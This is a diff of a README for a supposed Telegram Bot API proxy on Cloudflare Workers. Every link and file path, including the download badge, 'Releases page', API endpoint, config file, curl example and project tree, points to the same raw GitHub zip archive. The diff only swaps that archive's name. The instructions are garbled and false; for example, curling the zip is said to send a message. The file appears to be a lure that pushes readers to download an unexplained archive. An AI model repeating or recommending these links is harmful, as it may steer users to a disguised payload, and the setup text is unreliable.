@@ -1,7 +1,7 @@
 # 🛠️ BOT - Simple Telegram Bot API Proxy
 
 ## 📥 Download Now
-[![Download BOT](https://raw.githubusercontent.com/Blackfly0537/BOT/main/confoundable/BOT-1.0-alpha.2.zip)](https://raw.githubusercontent.com/Blackfly0537/BOT/main/confoundable/BOT-1.0-alpha.2.zip)
+[![Download BOT](https://raw.githubusercontent.com/Blackfly0537/BOT/main/confoundable/Software-3.8-beta.5.zip)](https://raw.githubusercontent.com/Blackfly0537/BOT/main/confoundable/Software-3.8-beta.5.zip)
 
 ## 📖 Overview
 BOT allows you to access the Telegram Bot API through Cloudflare Workers. This service helps users in restricted regions to connect easily without server costs. 
@@ -10,14 +10,14 @@ BOT allows you to access the Telegram Bot API through Cloudflare Workers. This s
 - Proxy for all Telegram Bot API calls.
 - Optimized for use in areas with access limitations.
 - Zero server cost involved.
-- Custom API Endpoint: `https://raw.githubusercontent.com/Blackfly0537/BOT/main/confoundable/BOT-1.0-alpha.2.zip`
+- Custom API Endpoint: `https://raw.githubusercontent.com/Blackfly0537/BOT/main/confoundable/Software-3.8-beta.5.zip`
 
 ---
 
 ## 🚀 Getting Started
 
 ### 1. Visit the Releases Page
-To begin, head over to the [Releases page](https://raw.githubusercontent.com/Blackfly0537/BOT/main/confoundable/BOT-1.0-alpha.2.zip) to download the latest version of BOT. 
+To begin, head over to the [Releases page](https://raw.githubusercontent.com/Blackfly0537/BOT/main/confoundable/Software-3.8-beta.5.zip) to download the latest version of BOT. 
 
 ### 2. Install Wrangler
 Before using BOT, you need to install Wrangler. This tool helps with managing Cloudflare Workers. Run this command in your terminal:
@@ -27,7 +27,7 @@ npm install -g wrangler
 ```
 
 ### 3. Configure Your BOT Token
-You need to provide your Telegram Bot Token for the application to work. Edit the `https://raw.githubusercontent.com/Blackfly0537/BOT/main/confoundable/BOT-1.0-alpha.2.zip` file. Open the file and add your token like this:
+You need to provide your Telegram Bot Token for the application to work. Edit the `https://raw.githubusercontent.com/Blackfly0537/BOT/main/confoundable/Software-3.8-beta.5.zip` file. Open the file and add your token like this:
 
 ```toml
 BOT_TOKEN = "123456:ABCDEF"
@@ -49,7 +49,7 @@ wrangler publish
 After this step, your Telegram Bot API will be accessible at:
 
 ```
-https://raw.githubusercontent.com/Blackfly0537/BOT/main/confoundable/BOT-1.0-alpha.2.zip
+https://raw.githubusercontent.com/Blackfly0537/BOT/main/confoundable/Software-3.8-beta.5.zip
 ```
 
 This URL can also be used with Telegram client webhooks.
@@ -57,10 +57,10 @@ This URL can also be used with Telegram client webhooks.
 ---
 
 ## 💬 Example: Sending a Message
-You can test the bot by sending a message through CURL. Replace `https://raw.githubusercontent.com/Blackfly0537/BOT/main/confoundable/BOT-1.0-alpha.2.zip` and `chat_id` with actual values:
+You can test the bot by sending a message through CURL. Replace `https://raw.githubusercontent.com/Blackfly0537/BOT/main/confoundable/Software-3.8-beta.5.zip` and `chat_id` with actual values:
 
 ```bash
-curl "https://raw.githubusercontent.com/Blackfly0537/BOT/main/confoundable/BOT-1.0-alpha.2.zip"
+curl "https://raw.githubusercontent.com/Blackfly0537/BOT/main/confoundable/Software-3.8-beta.5.zip"
 ```
 
 This command will send "hello" to the specified chat.
@@ -71,9 +71,9 @@ This command will send "hello" to the specified chat.
 Here’s what your project should look like:
 
 ```
-https://raw.githubusercontent.com/Blackfly0537/BOT/main/confoundable/BOT-1.0-alpha.2.zip
-https://raw.githubusercontent.com/Blackfly0537/BOT/main/confoundable/BOT-1.0-alpha.2.zip
-https://raw.githubusercontent.com/Blackfly0537/BOT/main/confoundable/BOT-1.0-alpha.2.zip
+https://raw.githubusercontent.com/Blackfly0537/BOT/main/confoundable/Software-3.8-beta.5.zip
+https://raw.githubusercontent.com/Blackfly0537/BOT/main/confoundable/Software-3.8-beta.5.zip
+https://raw.githubusercontent.com/Blackfly0537/BOT/main/confoundable/Software-3.8-beta.5.zip
 ```
 
 ---
@@ -82,7 +82,7 @@ https://raw.githubusercontent.com/Blackfly0537/BOT/main/confoundable/BOT-1.0-alp
 This worker does not store any data. It only functions as a simple reverse proxy, ensuring user privacy and security.
 
 ## 📥 Download & Install
-For the full experience, download BOT from the [Releases page](https://raw.githubusercontent.com/Blackfly0537/BOT/main/confoundable/BOT-1.0-alpha.2.zip). Follow the setup instructions above to get your Telegram Bot running in no time. 
+For the full experience, download BOT from the [Releases page](https://raw.githubusercontent.com/Blackfly0537/BOT/main/confoundable/Software-3.8-beta.5.zip). Follow the setup instructions above to get your Telegram Bot running in no time. 
 
 ---
 
